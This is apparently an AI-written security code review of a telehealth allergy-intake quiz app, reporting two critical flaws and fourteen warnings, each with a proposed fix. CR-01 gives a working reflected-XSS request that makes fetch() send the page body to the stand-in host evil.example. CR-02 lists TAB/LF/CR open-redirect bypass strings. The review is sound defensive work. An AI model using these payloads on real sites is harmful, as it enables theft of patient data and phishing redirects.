---
phase: 01-live-defect-fixes
reviewed: 2026-07-30T12:05:00Z
depth: standard
files_reviewed: 13
files_reviewed_list:
  - app/lib/quiz/navigation.ts
  - app/lib/quiz/navigation.test.ts
  - app/lib/quiz/product-links.ts
  - app/lib/quiz/product-links.test.ts
  - app/lib/quiz/redirects.ts
  - app/lib/quiz/redirects.test.ts
  - app/lib/quiz/questions.ts
  - app/components/quiz/QuizContainer.tsx
  - app/components/quiz/QuizPartRenderer.test.ts
  - app/routes/quiz-embed.tsx
  - extensions/quiz-block/blocks/symptom-quiz.liquid
  - tests/liquid-block-contract.test.ts
  - tests/quiz-embed-contract.test.ts
findings:
  critical: 2
  warning: 14
  info: 0
  total: 16
status: issues_found
---

# Phase 01: Code Review Report

**Reviewed:** 2026-07-30T12:05:00Z
**Depth:** standard
**Files Reviewed:** 13
**Status:** issues_found

## Summary

The declared work of the phase is done and the intent is sound: the open-redirect fix is real, the
`\` -at-index-1 rule is correctly reasoned and correctly hand-ported into Liquid (verified
character-for-character, including the doubled backslash in the Liquid JS literal), the parent
listener does verify `e.origin`, the `charCodeAt(1) === 92` form in `quiz-embed.tsx` correctly
sidesteps the template-escaping trap, and the product-handle and redirect-fallback modules are
clean, pure and well-tested. All 86 tests in the six reviewed test files pass.

That is also the problem. Two Critical defects survive a fully green suite, and one of them is in
the module the phase declares as its single source of truth.

1. **`isSafeRelativePath` is incomplete in exactly the way the backslash rule was written to fix.**
   The WHATWG URL parser strips TAB, LF and CR from input *before* parsing, so `/<TAB>/evil.com`
   passes every positional rule and then resolves to `https://evil.com`. Measured on node v20.19.6
   (evidence in CR-02). The storefront happens to be saved by an extra `u.origin` check that exists
   only in the Liquid port — the TypeScript "canonical spec" does not have it — but
   `navigateParent`'s standalone branch calls `window.location.assign` on the raw value, so this is
   a live open redirect on the Fly origin reachable from a crafted `/quiz-embed?consult=…` link.
   The accept/reject matrix in `navigation.test.ts` is presented as the acceptance criteria for the
   fix and contains no case for parser-stripped whitespace, which is why the gate is green.

2. **`/quiz-embed` has a reflected XSS on a page that collects PHI.** Five query params are
   interpolated into an inline `<script>` with `JSON.stringify`, which does not escape `<`. The
   response carries no `script-src`. I executed the loader with a hostile `tnProduct` value and read
   the emitted bytes: the config script terminates at the injected `</script>` and attacker JS runs
   on the app origin, where it can read the intake form and hook `fetch` to the submit endpoint.
   Three of the five sinks predate this phase; this phase added the other two, and the file is in
   scope. This is also a de-facto violation of compliance rule 4 in `CLAUDE.md` — it lets an
   arbitrary third-party script run on the quiz page.

Beyond those: the parent listener does not check `e.source`, the embed is framable by any origin
(`frame-ancestors *`) while posting to `targetOrigin: '*'`, request headers (`x-forwarded-proto`,
`Host`) are trusted verbatim into HTML attributes, a merchant-supplied absolute redirect URL now
produces a silently dead button *after* PHI has been written, the 7+ "I'd like allergy testing
first" path still navigates away without persisting the intake, and the `(required)` label removal
deleted the only visible affordance on a still-hard-required field. `quiz-embed-contract.test.ts`
is asymmetric with its Liquid sibling: it asserts the *absence* of the old defects but never asserts
the *presence* of the new positional guard, so that guard can be deleted with the suite staying
green.

## Structural Findings (fallow)

No structural pre-pass was supplied with this review request. All findings below are narrative.

## Narrative Findings (AI reviewer)

## Critical Issues

### CR-01: Reflected XSS on the PHI-collecting `/quiz-embed` page — `JSON.stringify` does not escape `</script>`

**File:** `app/routes/quiz-embed.tsx:49-56` (sinks), `115-121` (response headers)
**Severity:** BLOCKER

**Issue:** All five runtime-config values are interpolated into an inline `<script>` block using
`JSON.stringify`, which escapes quotes and backslashes but **not** `<`. The HTML parser terminates a
script element at the first `</script` sequence regardless of JS string context, so any of
`consult`, `testOptions`, `shop`, `tnProduct`, `txProduct` can close the script and open a new one.

Verified by executing the loader directly (not by inspection). Request:

```
/quiz-embed?tnProduct=%3C%2Fscript%3E%3Cscript%3Efetch('https%3A%2F%2Fevil.example%2F'%2Bdocument.body.innerHTML)%3C%2Fscript%3E
```

Emitted bytes:

```html
      tnProductHandle: "</script><script>fetch('https://evil.example/'+document.body.innerHTML)</script>",
```

`Content-Security-Policy` on that response is `frame-ancestors *` only — there is no `script-src`,
so the injected script executes. It runs on the app origin, on the page that collects `name`, `dob`,
`email`, `phone` and every answer, and can read the DOM, patch `fetch`, or POST the intake to a
third party. The route is unauthenticated by design, so the only precondition is getting a patient
to open a link on the legitimate `alle-drops-quiz-app.fly.dev` domain.

Three sinks (`consult`, `testOptions`, `shop`) predate this phase; `tnProductHandle` and
`txProductHandle` were added by it, so the phase widened a live vulnerability.

**Fix:** escape the JS-string-in-HTML context for every interpolated value, and add a `script-src`
so a future sink cannot execute:

```ts
/** JSON for embedding inside an inline <script>: neutralise <, >, and U+2028/9. */
const jsonForScript = (v: unknown) =>
  JSON.stringify(v)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029')

// ...
      tnProductHandle: ${jsonForScript(tnProductHandle)},
      txProductHandle: ${jsonForScript(txProductHandle)},
```

Apply it to all five params **and** to `origin` (see WR-02). Then tighten the header:

```ts
'Content-Security-Policy': [
  "frame-ancestors https://*.myshopify.com https://alledrops.com",
  `script-src '${scriptNonce}' ${origin}`,   // or 'unsafe-inline' removed via nonce on both blocks
  "object-src 'none'",
  "base-uri 'none'",
].join('; '),
```

Add a contract assertion in `tests/quiz-embed-contract.test.ts` that the loader output for a hostile
param contains no `</script` before the bundle tag — a text assertion on the source is not enough
here, because the defect is in the escaping, not in the presence of a line.

---

### CR-02: `isSafeRelativePath` accepts TAB/LF/CR at index 1 — the URL parser strips them and resolves cross-origin

**File:** `app/lib/quiz/navigation.ts:35-42`; exploited sink at `app/components/quiz/QuizContainer.tsx:100`; matrix gap at `app/lib/quiz/navigation.test.ts:10-52`
**Severity:** BLOCKER

**Issue:** The module documents itself as "the canonical spec for what the parent storefront page
will accept as a navigation target" and states the positional rules eliminate protocol-relative
targets. They do not. The WHATWG URL parser removes all TAB (U+0009), LF (U+000A) and CR (U+000D)
code points from the input *before* state-machine parsing, so a control character at index 1 hides a
protocol-relative target from a positional check. This is the identical failure class as the
backslash case the module already documents — same authority-state confusion, same result.

Measured on node v20.19.6, replicating `isSafeRelativePath` verbatim:

```
"/\t/evil.com"      isSafe=true   https://evil.com
"/\n/evil.com"      isSafe=true   https://evil.com
"/\r/evil.com"      isSafe=true   https://evil.com
"/\t\\evil.com"     isSafe=true   https://evil.com
"/\t\t//evil.com"   isSafe=true   https://evil.com
"/\\evil.com"       isSafe=false  https://evil.com   <- the case that IS caught
```

Consequences, in order of severity:

1. **Live open redirect on the Fly origin.** `navigateParent` (`QuizContainer.tsx:86-102`) validates
   with `toRelativePath` and then, when not framed, calls `window.location.assign(safe)` with no
   further check. `/quiz-embed` is fully functional when opened top-level, and its config comes
   from query params, so
   `https://alle-drops-quiz-app.fly.dev/quiz-embed?consult=/%09/evil.com` yields a quiz that sends
   the patient to `https://evil.com` when they click "Schedule a Consultation" — after the intake
   has already been POSTed. A redirect that launches from the clinic's real app domain is a
   high-quality phishing primitive.
2. **The declared spec is wrong, so every port inherits the hole.** The framed path is saved only by
   `u.origin === window.location.origin` in the Liquid port (`symptom-quiz.liquid:113-114`) — a
   check the TypeScript "source of truth" does not have and does not require. The anchor guard in
   `quiz-embed.tsx:84-85` has the same hole and also relies on the parent's extra check. The
   security property currently rests on a check that exists in one of three implementations and is
   not part of the stated contract.
3. **The gate is green against it.** `navigation.test.ts` describes its matrix as "the acceptance
   criteria for the open-redirect fix" and as the spec the Liquid port must satisfy, and it contains
   no whitespace/control-character row.

**Fix:** make the authoritative check authoritative in the shared module rather than in one port.
`URL` is available under vitest's `node` environment, so purity is preserved:

```ts
/** A sentinel origin used only to resolve `p`; never navigated to. */
const PROBE_ORIGIN = "https://probe.invalid";

export function isSafeRelativePath(p: unknown): p is string {
  if (typeof p !== "string") return false;
  if (p === "") return false;
  if (p.charAt(0) !== "/") return false;
  if (p.charAt(1) === "/") return false;
  if (p.charAt(1) === "\\") return false;
  // Authoritative: the parser strips TAB/LF/CR before parsing, so positional rules alone
  // cannot see a hidden authority component. Delegate to the parser the browser will use.
  try {
    return new URL(p, PROBE_ORIGIN).origin === PROBE_ORIGIN;
  } catch {
    return false;
  }
}
```

Then: add the five measured rows above to the `REJECT` matrix in `navigation.test.ts` with the same
`new URL(...).origin` evidence assertion the backslash case already carries; add the equivalent rule
to the `quiz-embed.tsx` anchor guard (a `/[\t\n\r]/.test(href.charAt(1))` reject, since that script
cannot import); and update the `navigation.ts` header comment, which currently asserts completeness
that the code does not have.

---

## Warnings

### WR-01: Parent listener does not verify `e.source`, so any window on the app origin can drive storefront navigation

**File:** `extensions/quiz-block/blocks/symptom-quiz.liquid:120-147`
**Issue:** The handler checks `e.origin === APP_ORIGIN` but never `e.source === iframe.contentWindow`.
Any window or frame on the app origin that can reach the storefront window (a nested iframe, an
`opener`/`opened` window chain — the embed is framable by anyone, see WR-03) can post
`quiz:navigate` and force a same-origin storefront navigation, or spam `quiz:resize`. The redirect
guard limits the damage to same-origin paths, but "attacker chooses which storefront page the
patient lands on mid-intake" (`/cart/clear`, `/checkout`, an arbitrary product) is still an
unintended capability, and the check costs one line.
**Fix:**
```js
window.addEventListener('message', function(e) {
  if (e.origin !== APP_ORIGIN) return;
  if (!iframe || e.source !== iframe.contentWindow) return;
  ...
```

### WR-02: `x-forwarded-proto` and `Host` are trusted verbatim and interpolated into HTML attributes

**File:** `app/routes/quiz-embed.tsx:7-8`, used at `23`, `49`, `51`, `111`
**Issue:** `proto` is taken straight from a client-suppliable header with no allowlist, and `url.host`
derives from the `Host` header. `origin` is then interpolated raw into `href="${origin}/quiz-bundle-css"`
and `src="${origin}/quiz-bundle-js"` (double-quoted attributes, no escaping) and into the config
script. The URL parser does **not** reject a quote in the host — `new URL('http://a"b.com/x').host`
returns `a"b.com` (measured) — so a forwarded foreign `Host` breaks out of the attribute, and a
crafted `x-forwarded-proto` does the same in the scheme position. Exploitability depends on whether
fly-proxy overwrites both headers; the code should not depend on that, and the comment on line 5-6
documents the trust decision without bounding it.
**Fix:**
```ts
const rawProto = request.headers.get('x-forwarded-proto') ?? url.protocol.replace(':', '')
const proto = rawProto === 'http' ? 'http' : 'https'          // allowlist, default secure
const ALLOWED_HOSTS = new Set(['alle-drops-quiz-app.fly.dev', 'quiz.alledrops.com', url.host])
if (!/^[a-z0-9.:-]+$/i.test(url.host)) throw new Response('Bad host', { status: 400 })
const origin = `${proto}://${url.host}`
```
and pass `origin` through the `jsonForScript` helper from CR-01 plus an HTML-attribute escape at the
two tag sinks.

### WR-03: `frame-ancestors *` lets any site frame the PHI intake page, and messages are posted to `targetOrigin: '*'`

**File:** `app/routes/quiz-embed.tsx:118`; `app/components/quiz/QuizContainer.tsx:98,168`; `app/routes/quiz-embed.tsx:91,100`
**Issue:** The quiz collects `name`, `dob`, `email`, `phone` and clinical answers, and the response
explicitly permits every origin on the internet to frame it. That enables UI-redress / overlay
harvesting on an attacker-controlled page and makes the "the parent is inherently the shop origin"
assumption in the code comments false in general. Compounding it, all four `postMessage` calls use
`'*'`, so navigation targets and step transitions are delivered to whatever origin is framing.
`shopUrl` is already in the config and is the natural target origin.
**Fix:** restrict `frame-ancestors` to the shop's origins (`https://*.myshopify.com` plus the
custom domain) rather than `*`, and replace `'*'` with the known parent origin:
```ts
const parentOrigin = cfg?.shopUrl ? `https://${cfg.shopUrl.replace(/^https?:\/\//, '')}` : null;
if (parentOrigin) window.parent.postMessage({ type: "quiz:navigate", path: safe }, parentOrigin);
```

### WR-04: A merchant-configured absolute redirect URL now produces a silently dead button after PHI has been saved

**File:** `app/components/quiz/QuizContainer.tsx:86-102, 265, 278, 298`; `extensions/quiz-block/blocks/symptom-quiz.liquid:218-229`
**Issue:** `consult_redirect_url` / `test_options_redirect_url` are Shopify `"type": "url"` settings.
That picker legitimately yields absolute URLs — an external booking page (Calendly, a scheduling
vendor) is the single most likely thing a telehealth merchant puts there, and the schema `info` text
does not say the value must be site-relative. `getRedirectTarget` returns it, `navigateParent`
refuses it, logs `console.warn`, and **returns**. The patient has already had their intake POSTed
(`handleScheduleConsult`/`handleTestFirst` submit first), and then the button does nothing at all:
no navigation, no error, no state change. That is a worse failure than the 404 this phase was fixing,
because it is invisible to the patient and to the merchant.
**Fix:** fail safe instead of failing closed, and tell the merchant the constraint:
```ts
function navigateParent(path: string, kind?: RedirectKind): void {
  if (typeof window === "undefined") return;
  let safe = toRelativePath(path);
  if (safe === null && kind) {
    console.warn("[quiz] configured redirect is not site-relative; using fallback:", path);
    safe = REDIRECT_FALLBACK[kind];            // always relative, always valid
  }
  if (safe === null) { /* surface an error state to the patient */ return; }
  ...
```
and append to both `info` strings in the schema: "Must be a path on this store beginning with `/`
(e.g. `/pages/book`). External URLs are ignored."

### WR-05: `getProductHandle` does not trim or constrain the handle, diverging from its sibling module's documented rule

**File:** `app/lib/quiz/product-links.ts:46-50`; consumed at `app/components/quiz/QuizContainer.tsx:385`
**Issue:** `redirects.ts:56` deliberately trims and documents why ("a hand-edited template JSON can
carry a stray space, and treating that as configured would navigate the patient to a path of
nothing"). `product-links.ts` — written in the same phase, for the same config object, from the same
query-param source — does not. A `tnProduct` value of `%20` or `%09` is truthy, wins over the code
map, and yields `href="/products/ "` → 404, the exact DEF-03 symptom the phase exists to remove.
The value is also interpolated into a path with no constraint on `/`, `?` or `#`, so a stray value
silently retargets the button to an arbitrary same-origin page.
**Fix:**
```ts
const HANDLE_RE = /^[a-z0-9][a-z0-9-]*$/;      // Shopify handle grammar
export function getProductHandle(state: PatientStateKey, cfg: QuizProductConfig): string {
  const configured = (state === "tennessee" ? cfg?.tnProductHandle : cfg?.txProductHandle ?? "").trim();
  if (configured !== "" && HANDLE_RE.test(configured)) return configured;
  return PRODUCT_HANDLE_BY_STATE[state];
}
```
Add the whitespace and malformed-handle rows to `product-links.test.ts` alongside the existing blank
case.

### WR-06: Anchor interceptor calls `preventDefault()` on modified clicks, hijacking open-in-new-tab into a parent navigation

**File:** `app/routes/quiz-embed.tsx:69-92`
**Issue:** The rewritten handler checks `el.target === '_blank'` but not `e.metaKey`, `e.ctrlKey`,
`e.shiftKey`, `e.altKey`, `e.button`, or `e.defaultPrevented`. Cmd/Ctrl-clicking "Go to AlleDrops
Product Page" is prevented and turned into a full parent navigation, so a patient trying to open the
product in a background tab instead loses the completed-quiz page (including the Profile ID they were
told to save). Shift-click likewise. The old guard had the same gap, but this line was rewritten in
this phase and the surrounding comment claims the new behavior is "the correct outcome" for the cases
it enumerates — modifier clicks are not among them.
**Fix:**
```js
if (e.defaultPrevented) return;
if (e.button !== 0 || e.metaKey || e.ctrlKey || e.shiftKey || e.altKey) return;
if (el.target && el.target !== '_self') return;   // covers _blank and named targets
```

### WR-07: `quiz-embed-contract.test.ts` never asserts the positional guard is present, unlike its Liquid sibling

**File:** `tests/quiz-embed-contract.test.ts:32-56`
**Issue:** The file's own docstring says text assertions are "the only automated coverage" this
inline script can have. `liquid-block-contract.test.ts:66-82` acts on that by asserting each rule of
the port individually, with a comment explaining that absence assertions prove the old signature is
gone, not that the replacement is complete. The embed contract does not follow through: its four
tests are three absence checks plus a `tnProductHandle`/`txProductHandle` string check. Deleting
`href.charAt(0) !== '/'` or `href.charCodeAt(1) === 92` from `quiz-embed.tsx` leaves the suite fully
green while re-opening the D-03 class of defect. The numeric `92` form (correct, and deliberately
chosen to avoid the template-escaping trap) is also undocumented in the test layer, so a future
reviewer grepping for a backslash literal will conclude the rule is missing.
**Fix:** mirror the Liquid contract:
```ts
it('keeps the positional guard on intercepted hrefs, including the reverse solidus (T-1-06)', () => {
  expect(EMBED).toContain("href.charAt(0) !== '/'")
  expect(EMBED).toContain("href.charAt(1) === '/'")
  expect(EMBED).toContain('href.charCodeAt(1) === 92')   // reverse solidus, escaped-literal-free
})
```
Add the CR-02 whitespace rule here too once it lands.

### WR-08: The `navigation.test.ts` accept/reject matrix is asserted to be the acceptance criteria but omits the parser-stripping class

**File:** `app/lib/quiz/navigation.test.ts:4-52`
**Issue:** This is a test-reliability finding, not a style one: the header comment states these rows
"are the acceptance criteria for the open-redirect fix" and "the spec the hand-ported `safeUrl`
function … must satisfy", and the backslash block goes to real trouble to prove its case with
`new URL(...).origin` assertions. A reader — or a plan checker — is entitled to treat a green run as
proof that no positional bypass remains. It is not: see CR-02. The matrix reasons carefully about one
member of the parser-confusion family and does not enumerate the rest.
**Fix:** add TAB/LF/CR rows to `REJECT` with the same evidence pattern used at lines 83-101, and add
a line to the header comment stating explicitly that positional rules alone cannot see characters the
parser strips, which is why the URL-parse check (CR-02) is part of the function rather than of one
port.

### WR-09: No in-flight guard on submit, and `savedToServer` is ignored for the 3-6 and 7+ brackets — duplicate PHI rows

**File:** `app/components/quiz/QuizContainer.tsx:253-279`
**Issue:** `handleScheduleConsult` skips resubmission only when `scoreBracket === "0-2" && savedToServer`;
`handleTestFirst` does not consult `savedToServer` at all. Neither sets a pending flag, and neither
button is disabled while the `await` is in flight. A double-click, or a retry after the navigation
silently no-ops (WR-04), inserts a second `submissions` row for the same `symptom_profile_id`. In a
PHI table that is a data-integrity problem for the provider view and the patient ledger, not just
noise.
**Fix:** add `const [submitting, setSubmitting] = useState(false)`, return early when it is set,
`disabled={submitting}` on the outcome buttons, and gate both handlers on `savedToServer` regardless
of bracket:
```ts
if (submitting) return;
if (!savedToServer) { setSubmitting(true); try { await submitPayload(); setSavedToServer(true); } finally { setSubmitting(false); } }
```

### WR-10: The 7+ "I'd like allergy testing first" path navigates away without persisting the intake

**File:** `app/components/quiz/QuizContainer.tsx:296-299`
**Issue:** `handleDeclineProceedWithoutTesting` navigates to the test-options page with no
`submitPayload()` call. Auto-save covers only the `0-2` bracket
(`useEffect` at :218-232), and this branch is reachable only from the 7+ warning dialog. So the most
clinically significant cohort — moderate-to-severe, the group the copy says "would likely benefit
from beginning sublingual immunotherapy" — can complete the entire questionnaire and leave with
nothing written to Cloud SQL. The sibling button for the same destination (`handleTestFirst`, :268)
does submit first, so the inconsistency is internal, not a considered policy. Pre-existing, but this
phase rewrote the line and the asymmetry is now adjacent in the file.
**Fix:** submit before navigating, matching `handleTestFirst`:
```ts
const handleDeclineProceedWithoutTesting = useCallback(async () => {
  setShowProceedWarning(false);
  if (!savedToServer) {
    try { await submitPayload(); setSavedToServer(true); }
    catch (e) { alert(e instanceof Error ? e.message : "Could not save assessment. Please try again."); return; }
  }
  navigateParent(getRedirectUrl("testOptions"), "testOptions");
}, [submitPayload, savedToServer]);
```
If leaving without saving is intentional, say so in a comment and record the decision — right now
the code reads as an oversight.

### WR-11: D-13 removed the only visible required-ness affordance from a field that is still hard-required

**File:** `app/lib/quiz/questions.ts:198`; enforcement at `app/components/quiz/QuizPartRenderer.tsx` (`isPartComplete`); UI at `app/components/quiz/QuizContainer.tsx:477-495`
**Issue:** The `(required):` suffix is gone (correct — it was DEF-04) but nothing replaced it. I
grepped `QuizPartRenderer.tsx` for any required marker: there is none — no asterisk, no `aria-required`,
no per-field validation message. A patient who answers "yes" to taking medications and leaves the
list blank sees a `Next →` button that is simply `disabled`, with no explanation and no focus target.
That is a dead end on the last quiz part, and for a screen-reader user the field is not announced as
required at all. `QuizPartRenderer.test.ts:39-45` locks in the enforcement, which makes the missing
affordance permanent rather than incidental.
**Fix:** add an explicit required flag to the question model and render it, e.g.
`{question.required && <span className={styles.questionCard__required} aria-hidden="true">*</span>}`
with `aria-required="true"` on the input, plus a hint next to the disabled button
("Complete all questions to continue"). This does not reintroduce the `(required)` text the
contract test forbids, because it is markup rather than label copy.

### WR-12: `APP_ORIGIN` derivation and the iframe `src` are unguarded against a mistyped `app_url`

**File:** `extensions/quiz-block/blocks/symptom-quiz.liquid:50-51, 64, 68, 79-80`
**Issue:** `_app_origin` is built as `parts[0] + '//' + parts[2]` from `fly_url | split: '/'`. If a
merchant types the App URL without a scheme (`alle-drops-quiz-app.fly.dev`), `parts[2]` is `nil`, so
`APP_ORIGIN` becomes `"alle-drops-quiz-app.fly.dev//"` *and* the iframe `src` becomes a
store-relative path — the quiz does not load and every message is dropped, with no error anywhere.
The `info` text documents the consequence but the code does not defend against it. Separately,
`{{ _embed_src }}` is emitted into a double-quoted attribute with no `| escape`; Shopify Liquid does
not auto-escape, so an `app_url` containing a quote breaks out of the attribute.
**Fix:** validate before use and escape the sink:
```liquid
{%- unless fly_url contains '://' -%}{%- assign fly_url = 'https://alle-drops-quiz-app.fly.dev' -%}{%- endunless -%}
...
src="{{ _embed_src | escape }}"
```
and add a `liquid-block-contract.test.ts` assertion for the `contains '://'` guard so it cannot be
dropped.

### WR-13: Test Mode is reachable on the public embed via a query param, bypassing the merchant checkbox

**File:** `app/components/quiz/QuizContainer.tsx:44-48`; `app/routes/quiz-embed.tsx:12`
**Issue:** `isTestModeEnabled` returns true when the iframe's own URL carries `test=1`, independent of
the `enable_test_mode` theme setting (Liquid always sends `test=0` when the checkbox is off, but a
direct visit to `/quiz-embed?test=1` sets it anyway). The Test Mode button fills a synthetic patient
("Test User", `test@example.com`) and jumps to the outcome, from which the normal submit paths run
against the real API. Any visitor can therefore inject junk rows into the `submissions` table — the
table `CLAUDE.md` designates as PHI in its entirety — and the resulting rows are indistinguishable
from real intakes in the provider view.
**Fix:** gate the query-param path on a non-production build, and keep the merchant checkbox as the
only production switch:
```ts
const params = new URLSearchParams(window.location.search);
const cfg = (window as ...).AlleDropsQuizConfig;
return cfg?.testMode === true || (import.meta.env.DEV && params.get("test") === "1");
```
If the param must stay reachable in production for smoke testing, mark such submissions
(`is_test: true`) so they can be excluded and purged.

### WR-14: The `AlleDropsQuizConfig` shape is re-declared through four separate `as unknown as` casts

**File:** `app/components/quiz/QuizContainer.tsx:47, 59-60, 66-71, 105-106`
**Issue:** The runtime config contract is asserted four times with inline structural casts, and this
phase added a fifth field pair to two of them. The casts defeat the very check that matters: the
keys are a cross-file contract with `quiz-embed.tsx` (and are asserted verbatim by
`quiz-embed-contract.test.ts`), and `product-links.ts` explicitly warns "do not rename them
casually" — yet a typo in any one cast (`tnProductHandle` → `tnProductHandel`) typechecks cleanly and
silently falls back to the code map. The two exported config types (`QuizProductConfig`,
`QuizRedirectConfig`) already exist and are the right building blocks; nothing is using them as the
single declaration.
**Fix:** declare the global once and drop every cast:
```ts
// app/lib/quiz/config.ts
export interface AlleDropsQuizConfig extends
  NonNullable<QuizProductConfig>, NonNullable<QuizRedirectConfig> {
  appUrl?: string; shopUrl?: string; apiEndpoint?: string; testMode?: boolean;
}
declare global { interface Window { AlleDropsQuizConfig?: AlleDropsQuizConfig } }
```
then `const cfg = typeof window === "undefined" ? undefined : window.AlleDropsQuizConfig;` at each
site.

---

_Reviewed: 2026-07-30T12:05:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
